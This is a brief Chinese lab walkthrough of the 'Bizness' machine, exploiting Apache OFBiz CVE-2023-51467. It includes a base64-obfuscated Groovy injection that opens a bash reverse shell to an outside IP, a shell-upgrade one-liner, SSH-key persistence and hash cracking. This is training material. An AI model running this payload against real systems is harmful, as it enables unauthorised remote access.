## Bizness
#CVE-2023-51467
dirsearch 扫描

![](attachments/Pasted%20image%2020240404203111.png)

OFBiz18.12为存在漏洞版本

![](attachments/Pasted%20image%2020240404203325.png)

直接打

![](attachments/Pasted%20image%2020240404204932.png)

反弹shell
```
throw+new+Exception('bash+-c+{echo,YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC43Ni84ODg4IDA%2BJjE%3D}|{base64,-d}|{bash,-i}'.execute().text);
```

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

上传自身ssh公钥维权

![](attachments/Pasted%20image%2020240404210953.png)

95548fdaecb252a12165a37ae84cc94f

最后提权是在存放数据的地方拿到admin的hash，做爆破